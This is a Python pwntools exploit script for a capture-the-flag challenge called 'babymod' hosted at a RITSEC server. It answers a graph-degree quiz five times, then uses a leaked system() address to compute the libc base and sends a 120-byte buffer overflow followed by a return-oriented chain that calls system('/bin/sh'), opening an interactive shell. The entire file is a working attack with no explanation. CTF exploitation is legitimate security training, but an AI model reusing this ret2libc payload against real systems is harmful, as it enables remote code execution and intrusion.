#!/usr/bin/python

from pwn import *
import sys
import numpy as np

remote_ip, port = 'challenges1.ritsec.club', 1339
binary = './babymod'
brkpts = '''
'''


elf = ELF("babymod")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

class Graph:
    def __init__(self, size):
        self.array = np.zeros([size,size])
        self.size = size
    def addedge(self, m, n):
        self.array[m,n] = 1
    def indegree(self, n):
        count = 0
        for i in range(self.size):
            if self.array[i, n] == 1:
                count = count + 1
        return count
    def outdegree(self, n):
        count = 0
        for i in range(self.size):
            if self.array[n, i] == 1:
                count = count + 1
        return count

if __name__ == "__main__":
    for i in range(5):
        rl()
        data = rl()
        V = int(data.split()[2])
        E = int(data.split()[6])
        g = Graph(V)
        for _ in range(E):
            val = rl()
            g.addedge(int(val.split()[0]), int(val.split()[1]))
        ret = True
        for j in range(V):
            if (g.indegree(j) + g.outdegree(j)) % 2 != 0:
                ret = False
                break
        sla("(Y/N)\n", "Y" if ret else "N")
    system = int(rl().split()[-1], 16)
    libc.address = system - libc.symbols['system']
    binsh = next(libc.search("/bin/sh"))
    ret = libc.address + 0x25679
    rdi = 0x4017c3
    gdb.attach(io)
    payload = "a"*120 + flat([
        rdi,
        binsh,
        ret,
        system
    ])
    sl(payload)

    io.interactive()
